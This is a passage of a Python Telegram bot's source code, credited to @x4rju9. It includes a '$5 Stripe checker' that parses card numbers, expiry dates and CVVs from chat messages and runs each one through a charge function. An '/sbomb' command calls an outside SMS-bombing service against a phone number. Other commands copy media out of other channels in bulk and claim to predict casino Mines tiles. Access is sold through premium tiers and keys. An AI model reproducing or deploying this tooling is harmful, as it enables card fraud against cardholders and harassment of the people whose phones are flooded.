                            [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ꜰʟᴇx ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴄ ‼`
                            ━━━━━━━━━━━━━━━━━━━━━━━━
                            [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                            [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                            [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                            res = formatMessage(res)
                            await event.reply(res)
                            return
                
                if len(results) >= 1:
                    shouldReturn = False
                    if event.is_private:
                        if not user in premium_users and not haveKey:
                            shouldReturn = True
                    elif event.is_group:
                        if not user in premium_users and not haveKey:
                            if event.chat_id in authorized_chats:
                                if len(results) > 1:
                                    shouldReturn = True
                                else:
                                    shouldReturn = False
                            else:
                                shouldReturn = True
                    
                    if shouldReturn:
                        res = f"""
                        [✯] $𝟱 𝗦𝗧𝗥𝗜𝗣𝗘 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
                        ━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ‼`
                        [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ `ɴᴏ ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏᴜɴᴅ ‼`
                        ━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                        [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                        [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                
                cc, mm, yy, cvv = "", "", "", ""

                await client.send_message("me", f"Task id: `{TASK_ID}`\nFor Message:\n{event.raw_text}")

                for match in results:

                    if asyncio.current_task().cancelled():
                            print("Task has been cancelled.")
                            break
                    
                    if not POOL.get(user) == None:
                        cooldown = time() - POOL.get(user)
                        m_cooldown = 30
                        if user == "x4rju9":
                            m_cooldown = 2
                        elif user in premium_users:
                            m_cooldown = 5
                        elif haveKey:
                            m_cooldown = 7
                        if cooldown < m_cooldown:
                            cooldown = m_cooldown-cooldown
                            editMessage = await event.reply(f"ᴄᴏᴏʟᴅᴏᴡɴ ꜰᴏʀ: {round(cooldown, 2)} ꜱᴇɢᴜɴᴅᴏꜱ ⏳")
                            shouldEditMessage = True
                            if user in premium_users:
                                await asyncio.sleep(cooldown)
                            else:
                                return
                        else:
                            del POOL[user]

                    if pattern == 1:
                        cc = match[0]
                        mm = match[1]
                        yy = match[2]
                        cvv = match[3]
                    elif pattern == 2:
                        cc = match[0]
                        mm = match[2]
                        yy = match[3]
                        cvv = match[1]
                    elif pattern == 3:
                        cc = "".join(match[0:4])
                        mm = match[4]
                        yy = match[5]
                        cvv = match[6]
                    elif pattern == 4:
                        cc = "".join(match[0:4])
                        mm = match[5]
                        yy = match[6]
                        cvv = match[4]
                    if len(yy) < 4:
                        yy = "20" + yy
                    status, mes, time_taken = flex(cc, mm, yy, cvv)
                    message = f"""
                    [✯] $𝟱 𝗦𝗧𝗥𝗜𝗣𝗘 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
                    ━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ᴄᴄ** ↯ `{cc}`
                    [✯] **ᴇxᴘɪʀʏ** ↯ `{mm}/{yy}`
                    [✯] **ᴄᴠᴄ** ↯ `{cvv}`
                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ {status}
                    [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ {mes}
                    [✯] **ᴛɪᴍᴇ ᴛᴀᴋᴇɴ** ↯ {time_taken} ꜱᴇɢᴜɴᴅᴏꜱ ⌛
                    ━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                    [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                    message = formatMessage(message)
                    if shouldEditMessage:
                        await editMessage.edit(message)
                        editMessage = None
                        shouldEditMessage = False
                    else:
                        await event.reply(message)
                    POOL[user] = time()
            except:
                print("Task must be cancelled.")
        
        flex_pattern = r"^/flex"
        @client.on(events.NewMessage(pattern=flex_pattern))
        async def charge_five_dollar(event):
            global TASK_ID
            global active_tasks
            task = asyncio.create_task(flex_charge(event))
            TASK_ID = generate_unique_id()
            active_tasks[TASK_ID] = task
        
        append_pattern = r"^/append"
        @client.on(events.NewMessage(pattern=append_pattern))
        async def grant_premium(event):
            global premium_users
            try:
                user = await event.get_sender()
                user = user.username

                if not user == "x4rju9":
                    await event.reply("ᴡʜᴏ ᴅᴏ ʏᴏᴜ ᴛʜɪɴᴋ ʏᴏᴜ'ʀᴇ ᴏɴʟʏ ‼\nʟᴏʀᴅ ᴄᴀɴ ᴀᴜᴛʜᴏʀɪᴢᴇ ᴘᴇᴏᴘʟᴇ.")
                    return
                
                user2 = sub(append_pattern, "", event.raw_text).strip()
                if "" == user2 or len(user2) <= 1:
                    if not event.reply_to:
                        await event.reply("ᴄᴀɴ'ᴛ ꜰɪɴᴅ ᴀɴʏ ᴜꜱᴇʀ ᴛᴏ ᴀᴜᴛʜᴏʀɪᴢᴇ ‼")
                    else:
                        replied = await event.get_reply_message()
                        user2 = await replied.get_sender()
                        user2 = user2.username
                
                premium_users.append(user2)
                await event.reply(f"ᴜꜱᴇʀ @{user2} ɪꜱ ᴀᴘᴘᴇɴᴅᴇᴅ ᴛᴏ ᴛʜᴇ ʟɪꜱᴛ ᴏꜰ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ ✅")
            except:
                pass
        
        remove_pattern = r"^/remove"
        @client.on(events.NewMessage(pattern=remove_pattern))
        async def grant_premium(event):
            global premium_users
            try:
                user = await event.get_sender()
                user = user.username

                if not user == "x4rju9":
                    await event.reply("ᴡʜᴏ ᴅᴏ ʏᴏᴜ ᴛʜɪɴᴋ ʏᴏᴜ'ʀᴇ ᴏɴʟʏ ‼\nʟᴏʀᴅ ᴄᴀɴ ᴀᴜᴛʜᴏʀɪᴢᴇ ᴘᴇᴏᴘʟᴇ.")
                    return
                
                user2 = sub(remove_pattern, "", event.raw_text).strip()
                if "" == user2 or len(user2) <= 1:
                    if not event.reply_to:
                        await event.reply("ᴄᴀɴ'ᴛ ꜰɪɴᴅ ᴀɴʏ ᴜꜱᴇʀ ᴛᴏ ᴀᴜᴛʜᴏʀɪᴢᴇ ‼")
                    else:
                        replied = await event.get_reply_message()
                        user2 = await replied.get_sender()
                        user2 = user2.username
                
                premium_users.remove(user2)
                await event.reply(f"ᴜꜱᴇʀ @{user2} ɪꜱ ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ʟɪꜱᴛ ᴏꜰ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ ‼")
            except:
                pass
        
        grant_auth_pattern = r"^/auth"
        @client.on(events.NewMessage(pattern=grant_auth_pattern))
        async def grant_auth(event):
            global AUTH_KEY_POOL
            global authorized_chats
            try:
                user = await event.get_sender()
                user = user.username

                if not user == "x4rju9":
                    await event.reply("ᴡʜᴏ ᴅᴏ ʏᴏᴜ ᴛʜɪɴᴋ ʏᴏᴜ'ʀᴇ ᴏɴʟʏ ‼\nᴏɴʟʏ ʟᴏʀᴅ ᴍᴀɴᴀɢᴇꜱ ᴛʜᴇ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴꜱ.")
                    return
                
                user2 = sub(grant_auth_pattern, "", event.raw_text).strip()
                status = False
                random_key = f"ACCESS {generate_keys()}"
                if "" == user2 or len(user2) <= 0:
                    if not event.reply_to:
                        if event.is_group:
                            authorized_chats.append(event.chat_id)
                            await event.reply(f"ᴄʜᴀᴛ ɪᴅ `{event.chat_id}` ɪꜱ ᴀᴘᴘᴇɴᴅᴇᴅ ᴛᴏ ᴛʜᴇ ʟɪꜱᴛ ᴏꜰ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴄʜᴀᴛ ʟɪꜱᴛ ✅")
                        else:
                            await event.reply("ᴄᴀɴ'ᴛ ꜰɪɴᴅ ᴀɴʏ ᴜꜱᴇʀ ᴛᴏ ᴀᴜᴛʜᴏʀɪᴢᴇ ‼")
                        return
                    else:
                        replied = await event.get_reply_message()
                        user2 = await replied.get_sender()
                        user2 = user2.username
                        AUTH_KEY_POOL[user2] = random_key
                        try:
                            await client.send_message(user2, f"ʏᴏᴜʀ ᴋᴇʏ ɪꜱ ɢᴇɴᴇʀᴀᴛᴇᴅ ✅\n`{random_key}`\nᴅᴏ ɴᴏᴛ ꜱʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ‼")
                            status = True
                        except:
                            await client.send_message("me", f"ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏʀ ᴛʜᴇ @{user2} ✅\n`{random_key}`\nᴅᴏ ɴᴏᴛ ꜱʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ‼")
                            status = False
                else:
                    AUTH_KEY_POOL[user2] = random_key
                    try:
                        await client.send_message(user2, f"ʏᴏᴜʀ ᴋᴇʏ ɪꜱ ɢᴇɴᴇʀᴀᴛᴇᴅ ✅\n`{random_key}`\nᴅᴏ ɴᴏᴛ ꜱʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ‼")
                        status = True
                    except:
                        await client.send_message("me", f"ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏʀ ᴛʜᴇ @{user2} ✅\n`{random_key}`\nᴅᴏ ɴᴏᴛ ꜱʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ‼")
                        status = False
                
                if status:
                    await event.reply(f"ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ᴀɴᴅ ᴅᴇʟɪᴠᴇʀᴇᴅ ᴛᴏ ᴛʜᴇ @{user2} ✅")
                else:
                    await event.reply(f"ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʙᴜᴛ ᴅᴇʟɪᴠᴇʀʏ ᴛᴏ @{user2} ɪꜱ ꜰᴀɪʟᴇᴅ ‼")
            except:
                pass
        
        revoke_auth_pattern = r"^/dauth"
        @client.on(events.NewMessage(pattern=revoke_auth_pattern))
        async def revoke_auth(event):
            global AUTH_KEY_POOL
            global authorized_chats
            try:
                user = await event.get_sender()
                user = user.username

                if not user == "x4rju9":
                    await event.reply("ᴡʜᴏ ᴅᴏ ʏᴏᴜ ᴛʜɪɴᴋ ʏᴏᴜ'ʀᴇ ᴏɴʟʏ ‼\nᴏɴʟʏ ʟᴏʀᴅ ᴍᴀɴᴀɢᴇꜱ ᴛʜᴇ ᴅᴇᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴꜱ.")
                    return
                
                user2 = sub(revoke_auth_pattern, "", event.raw_text).strip()
                if "" == user2 or len(user2) <= 1:
                    if not event.reply_to:
                        if event.is_group:
                            authorized_chats.remove(event.chat_id)
                            await event.reply(f"ᴄʜᴀᴛ ɪᴅ `{event.chat_id}` ɪꜱ ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ʟɪꜱᴛ ᴏꜰ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴄʜᴀᴛ ʟɪꜱᴛ ‼")
                        else:
                            await event.reply("ᴄᴀɴ'ᴛ ꜰɪɴᴅ ᴀɴʏ ᴜꜱᴇʀ ᴛᴏ ᴅᴇᴀᴜᴛʜᴏʀɪᴢᴇ ‼")
                        return
                    else:
                        replied = await event.get_reply_message()
                        user2 = await replied.get_sender()
                        user2 = user2.username
                        key_to_be_deleted = AUTH_KEY_POOL[user2]
                        del AUTH_KEY_POOL[user2]
                        await event.reply(f"ᴋᴇʏ `{key_to_be_deleted}`\nᴀꜱꜱᴏᴄɪᴀᴛᴇᴅ ᴡɪᴛʜ @{user2} ɪꜱ ʀᴇᴠᴏᴋᴇᴅ ‼")
            except:
                pass

        @client.on(events.NewMessage(chats=fuel_movies))
        @client.on(events.MessageEdited(chats=fuel_movies))
        async def find_movies(event):
            try:
                message = event.message

                caption_message = f"{message.id} Untitled"
                if message.text:
                    caption_message = message.text
                
                if message.sticker:
                    print(f"Skipped Message with id: {message.id}")
                    return
                elif message.video:
                    await client.send_file(
                        -1002002129675,
                        message.video,
                        caption=caption_message
                    )
                elif message.document:
                    await client.send_file(
                        -1002002129675,
                        message.document,
                        caption=caption_message
                    )
                elif message.media:
                    await client.send_file(
                        -1002002129675,
                        message.media,
                        caption=caption_message
                    )
            except:
                pass

        async def sms_bomber(event):
            global POOL
            global AUTH_KEY_POOL
            global authorized_chats
            global BLACKLISTED
            try:
                editMessage = None
                shouldEditMessage = False
                # Getting the sender infor to extract the username
                user = await event.get_sender()
                user = user.username
                key = findall(r"ACCESS [A-Z0-9]{16}", event.raw_text)
                haveKey = False
                if len(key) >= 1:
                    key = key[0]
                    if key == AUTH_KEY_POOL.get(user):
                        haveKey = True
                # Membership status
                membership = "𝙵𝚁𝙴𝙴"
                # Setting membership status based on the who accesses it
                if user == "x4rju9":
                    membership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
                elif user in premium_users:
                    membership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
                elif haveKey:
                    membership = "ᴀᴜᴛʜ"
                number = sub(r"^/sbomb", "", event.raw_text).strip()
                if number == "" or len(number) != 10 or number == BLACKLISTED:
                    if not event.reply_to:
                        res = f"""
                        [✯] 𝗦𝗠𝗦 ⚡ 𝗕𝗢𝗠𝗕𝗘𝗥
                        ━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ɴᴜᴍʙᴇʀ ꜰᴏᴜɴᴅ ‼`
                        [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ꜱʙᴏᴍʙ 1234567890 ‼`
                        ━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                        [✯] **ʙᴏᴍʙᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                        [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                
                shouldReturn = False
                if event.is_private:
                    if not user in premium_users and not haveKey:
                        shouldReturn = True
                elif event.is_group:
                    if not user in premium_users and not haveKey:
                        if event.chat_id in authorized_chats:
                            shouldReturn = False
                        else:
                            shouldReturn = True
                    
                if shouldReturn:
                    res = f"""
                    [✯] 𝗦𝗠𝗦 ⚡ 𝗕𝗢𝗠𝗕𝗘𝗥 
                    ━━━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ‼`
                    [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ `ɴᴏ ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏᴜɴᴅ ‼`
                    ━━━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                    [✯] **ʙᴏᴍʙᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                    res = formatMessage(res)
                    await event.reply(res)
                    return
                    
                if not POOL.get(user) == None:
                    cooldown = time() - POOL.get(user)
                    m_cooldown = 30
                    if user == "x4rju9":
                        m_cooldown = 2
                    elif user in premium_users:
                        m_cooldown = 5
                    elif haveKey:
                        m_cooldown = 7
                    if cooldown < m_cooldown:
                        cooldown = m_cooldown-cooldown
                        editMessage = await event.reply(f"ᴄᴏᴏʟᴅᴏᴡɴ ꜰᴏʀ: {round(cooldown, 2)} ꜱᴇɢᴜɴᴅᴏꜱ ⏳")
                        shouldEditMessage = True
                        if user in premium_users:
                            await asyncio.sleep(cooldown)
                        else:
                            return
                    else:
                        del POOL[user]

                response = get(f"https://krishnabomb.onrender.com/mass/{number}")
                status_code = response.status_code
                time_taken = round(response.elapsed.total_seconds(), 2)

                rMessage = "Bombing Started"
                if not status_code == 200:
                    rMessage = "Try again later !!"
                
                message = f"""
                [✯] 𝗦𝗠𝗦 ⚡ 𝗕𝗢𝗠𝗕𝗘𝗥
                ━━━━━━━━━━━━━━━━━━━━━━
                [✯] **ɴᴜᴍʙᴇʀ** ↯ `{number}`
                [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ {status_code}
                [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ {rMessage}
                [✯] **ᴛɪᴍᴇ ᴛᴀᴋᴇɴ** ↯ {time_taken} ꜱᴇɢᴜɴᴅᴏꜱ ⌛
                ━━━━━━━━━━━━━━━━━━━━━━
                [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""

                message = formatMessage(message)

                if shouldEditMessage:
                    await editMessage.edit(message)
                    editMessage = None
                    shouldEditMessage = False
                else:
                    await event.reply(message)
                POOL[user] = time()
            except:
                pass
        
        sb_pattern = r"^/sbomb"
        @client.on(events.NewMessage(pattern=sb_pattern))
        async def sms_bomber_handler(event):
            global TASK_ID
            global active_tasks
            task = asyncio.create_task(sms_bomber(event))
            TASK_ID = generate_unique_id()
            active_tasks[TASK_ID] = task

        api_pattern = r"^/api"
        async def api_call(event):
            try:
                # Getting user info
                user = await event.get_sender()
                name = user.first_name
                username = user.username
                # Extracting question
                url = sub(api_pattern, "", event.raw_text).strip()
                if "" == url or len(url) <= 1:
                    if not event.reply_to:
                        res = f"""
                        **NO URL FOUND**
                        ━━━━━━━━━━━━━━━━
                        {name} is the dumbest person on internet.
                        ━━━━━━━━━━━━━━━━
                        **ᴜʀʟ ʙʏ** ↯ @{username}"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                    else:
                        replied = await event.get_reply_message()
                        url = sub(api_pattern, "", replied.raw_text).strip()
                
                if not "http" in url:
                    url = "http://" + url

                # Generating answer
                response = get(url)
                if response.status_code == 200:
                    response = response.text
                else:
                    response = "404: invalid API url."
                message_limit = 3000
                if len(response) >= message_limit:
                    response = response[:message_limit]

                res = f"""
                **{url}**
                ━━━━━━━━━━━━━━━━
                {response}
                ━━━━━━━━━━━━━━━━
                **ᴜʀʟ ʙʏ** ↯ @{username}
                **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                res = formatMessage(res)
                print(res)
                await event.reply(res, link_preview=False)
            except:
                pass
        
        @client.on(events.NewMessage(pattern=api_pattern))
        async def api_call_handler(event):
            global TASK_ID
            global active_tasks
            task = asyncio.create_task(api_call(event))
            TASK_ID = generate_unique_id()
            active_tasks[TASK_ID] = task

        snatch_pattern = r"^/snatch"
        async def snatch_media(event):

            message = sub(snatch_pattern, "", event.raw_text).strip()
            # /snatch s 348374837, d 837438473, c caption, i 9, t 30
            args = message.split(",")

            params = {}

            def add_params(key, value):
                params[key] = value.strip()

            for arg in args:
                arg = arg.strip().split(" ")
                if len(arg) == 2:
                    if arg[0].lower() == "s":
                        add_params("source", arg[1])
                    if arg[0].lower() == "d":
                        add_params("destination", arg[1])
                    if arg[0].lower() == "c":
                        add_params("caption", arg[1])
                    if arg[0].lower() == "i":
                        add_params("index", arg[1])
                    if arg[0].lower() == "t":
                        add_params("time", arg[1])
            
            if not "source" in params or not "destination" in params:
                event.reply("Source or Destination missing command will not be executed.")
                print("Source or Destination missing command will not be executed.")
                return

                
            caption_category = params.get("caption", "") if "caption" in params else ""

            skip_message_id = int(params.get("index", 0)) if "index" in params else 0
            shouldSkipMessages = False if skip_message_id == 0 else True

            delay_interval = int(params.get("time", 1)) if "time" in params else 1
            
            snatched_source = int(params.get("source")) if "-" in params.get("source") else params.get("source")
            snatched_destination = int(params.get("destination")) if "-" in params.get("destination") else params.get("destination")

            if shouldSkipMessages:
                await client.send_message(snatched_destination, f"Started Snatching !!\nFrom: {snatched_source}\nTo: {snatched_destination}\nSkip count: {skip_message_id}\nTask id: `{TASK_ID}`")
            else:
                await client.send_message(snatched_destination, f"Started Snatching !!\nFrom: {snatched_source}\nTo: {snatched_destination}\nTask id: `{TASK_ID}`")

            snatched_count = 0
            snatched_data = set()
            
            async def send_leeched(message):
                try:
                    global caption_category
                    # Default caption
                    caption_message = f"{snatched_count + 1}: Untitled {caption_category}"
                    
                    # Handle message text
                    if message.text:
                        caption_message = message.text
                        if caption_message in snatched_data:
                            return 0  # Duplicate caption
                        snatched_data.add(caption_message)

                    print(f"Caption: {caption_message}")
                    
                    # Skip stickers
                    if message.sticker:
                        return 0

                    # Determine the file to send
                    file_to_send = None
                    if message.video:
                        file_to_send = message.video
                    elif message.media:
                        file_to_send = message.media
                    elif message.document:
                        file_to_send = message.document

                    if file_to_send:
                        try:
                            await client.send_file(
                                snatched_destination,
                                file=file_to_send,
                                force_document=True,
                                caption=caption_message
                            )
                            return 1
                        except Exception as e:
                            print(f"Failed to send as document: {e}")
                            await client.send_file(
                                snatched_destination,
                                file=file_to_send,
                                caption=caption_message
                            )
                            print("File sent in original format successfully")
                            return 1
                    return 0
                except Exception as e:
                    print(f"Error in send_leeched: {e}")
                    return 0
            
            try:
                async for message in client.iter_messages(snatched_source, reverse = True):
                    try:
                        if shouldSkipMessages:
                            if message.id <= skip_message_id:
                                print(f"Skipped forwarding message ID {message.id}")
                                continue
                        print(f"forwarding message ID {message.id}\nCurrent Snach Count: {snatched_count + 1}")
                        snatched_count += await send_leeched(message)
                        await asyncio.sleep(delay_interval)
                        if asyncio.current_task().cancelled():
                            print("Task has been cancelled.")
                            break
                    except errors.FloodWaitError as e:
                        print(f"Flood wait for {e.seconds} seconds")
                        print(f"Successfully Snached: {snatched_count}")
                        for duration in range(1, e.seconds + 10):
                            print(f"Flood wait for {e.seconds} seconds")
                            await asyncio.sleep(delay_interval)
                        snatched_count += await send_leeched(message)
                    except Exception as e:
                        print(f"Error forwarding message ID {message.id}: {e}\nCurrent Snach Count: {snatched_count}")
                        await client.send_message("me", f"Error forwarding message ID {message.id}: {e}\nCurrent Snach Count: {snatched_count}")
                        continue
            except:
                print("Task must be cancelled.")
            
            await client.send_message(snatched_destination, f"Successfully Snached: {snatched_count}")
            print(f"Successfully Snached: {snatched_count}")
        
        @client.on(events.NewMessage(pattern=snatch_pattern))
        async def snatch_media_handler(event):
            global TASK_ID
            global active_tasks
            task = asyncio.create_task(snatch_media(event))
            print(TASK_ID)
            TASK_ID = generate_unique_id()
            print(TASK_ID)
            active_tasks[TASK_ID] = task
        
        cancel_task_pattern = r"^/cancel"
        @client.on(events.NewMessage(pattern=cancel_task_pattern))
        async def cancel_task(event):

            thread_id = sub(cancel_task_pattern, "", event.raw_text).strip()
            task = active_tasks.get(thread_id)

            if task:
                task.cancel()
                print(f"Task with id: {thread_id} has been cancelled.")
                await event.reply(f"Task with id: {thread_id} has been cancelled.")
            else:
                print(f"No active task found with id {thread_id}")
                await event.reply(f"No active task found with id {thread_id}")
        
        shutdown_pattern = r"^/shutdown"
        @client.on(events.NewMessage(pattern=shutdown_pattern))
        async def grant_premium(event):
            try:
                user = await event.get_sender()
                user = user.username

                if not user == "x4rju9":
                    await event.reply("ᴡʜᴏ ᴅᴏ ʏᴏᴜ ᴛʜɪɴᴋ ʏᴏᴜ'ʀᴇ ‼")
                    return
                
                await event.reply("Shutting Down")

            except:
                pass
            print("Shutting Down")
            exit()

        minex_pattern = r"^/minex"
        async def minex_predict(event):
            try:

                def input_previous_mines(raw_tiles):
                    previous_mine_tiles = raw_tiles
                    previous_mine_tiles = [int(tile.strip()) for tile in previous_mine_tiles.split(",")]
                    return previous_mine_tiles
                
                def save_seeds(username, client_seed, server_seed):
                    USER_SEEDS[username] = [client_seed, server_seed]
                    print(f"Seeds for {username} saved successfully.")
                
                def load_seeds(username):
                    if username in USER_SEEDS:
                        return USER_SEEDS[username]
                    else:
                        print(f"No seeds found for {username}.")
                        return None, None
                
                def delete_seeds(username):
                    if username in USER_SEEDS:
                        del USER_SEEDS[username]
                        print(f"Seeds for {username} deleted successfully.")
                    else:
                        print(f"No seeds found for {username}.")

                user = await event.get_sender()
                username = user.username

                raw_text = formatMessage(sub(minex_pattern, "", event.raw_text).strip())
                params = raw_text.split(",")

                client_seed, server_seed = load_seeds(username)
                if not client_seed or not server_seed:
                    if not len(params) >= 4:
                        message = f"""[✯] 𝗠𝗜𝗡𝗘𝗦 ⚡ 𝗣𝗥𝗘𝗗𝗜𝗖𝗧𝗢𝗥
                        ━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `can't find client and server seed`
                        [✯] **ꜰᴏʀᴍᴀᴛ** ↯ \n`client seed, server seed, mines, previous mines`
                        [✯] **ᴍɪɴᴇꜱ ᴘᴏꜱɪᴛɪᴏɴ** ↯ `left to right horizontally`
                        ━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                        [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{username}
                        [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                        await event.reply(formatMessage(message))
                        return
                    else:
                        client_seed = params[0].strip()
                        server_seed = params[1].strip()
                        save_seeds(username, client_seed, server_seed)
                
                if len(params) < 2:
                    message = f"""[✯] 𝗠𝗜𝗡𝗘𝗦 ⚡ 𝗣𝗥𝗘𝗗𝗜𝗖𝗧𝗢𝗥
                    ━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `enter mines and previous mines`
                    [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `mines, previous mines`
                    [✯] **ᴍɪɴᴇꜱ ᴘᴏꜱɪᴛɪᴏɴ** ↯ `left to right horizontally`
                    ━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                    [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{username}
                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                    await event.reply(formatMessage(message))
                    return
                if len(params) >= 4:
                    number_of_mines = int(params[2].strip())
                    previous_mine_tiles = [int(tile.strip()) for tile in params[3].split(" ")]
                else:
                    number_of_mines = int(params[0].strip())
                    previous_mine_tiles = [int(tile.strip()) for tile in params[1].split(" ")]

                output = runMine(client_seed, server_seed, number_of_mines, previous_mine_tiles)
                message = f"""[✯] 𝗠𝗜𝗡𝗘𝗦 ⚡ 𝗣𝗥𝗘𝗗𝗜𝗖𝗧𝗢𝗥
                ━━━━━━━━━━━━━━━━━━━━━━
                [✯] **ᴍɪɴᴇꜱ** ↯ {number_of_mines}
                [✯] **ᴘʀᴇᴠɪᴏᴜꜱ ᴍɪɴᴇꜱ** ↯ {previous_mine_tiles}
                ━━━━━━━━━━━━━━━━━━━━━━
                {output.strip()}
                ━━━━━━━━━━━━━━━━━━━━━━
                [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{username}
                [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                await event.reply(formatMessage(message))
            except:
                pass

        @client.on(events.NewMessage(pattern=minex_pattern))
        async def minex_call_handler(event):
            global TASK_ID
            global active_tasks
            task = asyncio.create_task(minex_predict(event))
            TASK_ID = generate_unique_id()
            active_tasks[TASK_ID] = task
        
        # start bot
        client.start()
        client.run_until_disconnected()

if __name__ == "__main__":
    keep_alive()
    main()
